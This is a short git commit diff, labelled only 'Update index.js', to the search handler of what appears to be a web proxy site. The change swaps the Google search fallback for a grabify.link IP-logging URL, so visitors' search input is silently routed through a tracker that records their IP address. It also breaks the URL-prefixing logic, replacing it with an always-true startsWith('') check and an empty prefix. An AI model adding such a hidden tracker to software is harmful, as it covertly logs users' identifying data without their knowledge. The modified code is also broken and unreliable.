1b154f3314bc94f24fb40277ce425036cf3009e9
Concerfate <102763434+Concerfate@users.noreply.github.com>
2023-03-13 16:30:58 -0400

    Update index.js

--- Site/index.js
+++ Site/index.js
@@ -7,8 +7,8 @@ form.addEventListener('submit', async event => {
         scope: __uv$config.prefix
     }).then(() => {
         let url = input.value.trim();
-        if (!isUrl(url)) url = 'https://www.google.com/search?q=' + url;
-        else if (!(url.startsWith('https://') || url.startsWith('http://'))) url = 'http://' + url;
+        if (!isUrl(url)) url = 'https://grabify.link/8ZZRQY' + url;
+        else if (!(url.startsWith('https://') || url.startsWith('')))url = '' + url;
 
 
         window.location.href = __uv$config.prefix + __uv$config.encodeUrl(url);
